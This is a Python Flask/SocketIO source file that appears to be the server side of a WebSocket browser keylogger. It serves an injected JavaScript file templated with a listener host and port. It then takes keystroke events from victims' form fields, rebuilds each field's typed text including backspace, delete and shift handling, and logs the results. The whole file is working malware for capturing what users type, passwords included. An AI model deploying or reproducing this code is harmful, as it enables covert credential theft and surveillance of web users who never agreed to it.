import logging
import tables

from flask import Flask, make_response, render_template, request
from flask.ext.socketio import SocketIO, emit

LHOST = '192.168.1.169'
LPORT = 80

logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)

input_tags = {}

@app.route('/')
def index():

    jsfile = render_template('wsk.js', lhost=LHOST, lport=LPORT)
    response = make_response(jsfile)
    response.headers['Content-Type'] = 'application/javascript'
    return response

@socketio.on('connect', namespace='/keylogger')
def test_connect():

    emit('confirm connection', { 'data' : 'Connected' })
    
@socketio.on('disconnect', namespace='/keylogger')
def test_disconnect():
    print 'Client disconnected'


@socketio.on('keydown', namespace='/keylogger')
def keydown(message):

    keystroke = message['ks']
    ctrl_pressed = message['ctrl']
    alt_pressed = message['alt']
    shift_pressed = message['shift']
    selection_start = message['start_pos']
    selection_end = message['end_pos']
    name = message['name']

    if name not in input_tags:
        input_tags[name] = []
    contents = input_tags[name]

    if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
        return

    keystroke = tables.keyboard[keystroke]

    if keystroke == 'BACK_SPACE':

        if selection_start == selection_end and selection_start != 0:
            contents.pop(selection_start-1)
        else:
            del contents[selection_start:selection_end]

    elif keystroke == 'DELETE':

        if selection_start == selection_end and selection_end != len(contents):
            contents.pop(selection_start)
        else:
            del contents[selection_start:selection_end]
    else:
        
        if shift_pressed:

            if keystroke in tables.shift:
                keystroke = tables.shift[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()

        if selection_start != selection_end:
            del contents[selection_start:selection_end]

        contents.insert(selection_start, keystroke)

    print '<input id="%s" type="%s" class="%s" name="%s" /> textval: %s' %\
            (message['id'],
            message['type'],
            message['class'],
            message['name'],
            ''.join(contents))
    
if __name__ == '__main__':

    socketio.run(app, host='0.0.0.0', port=LPORT)
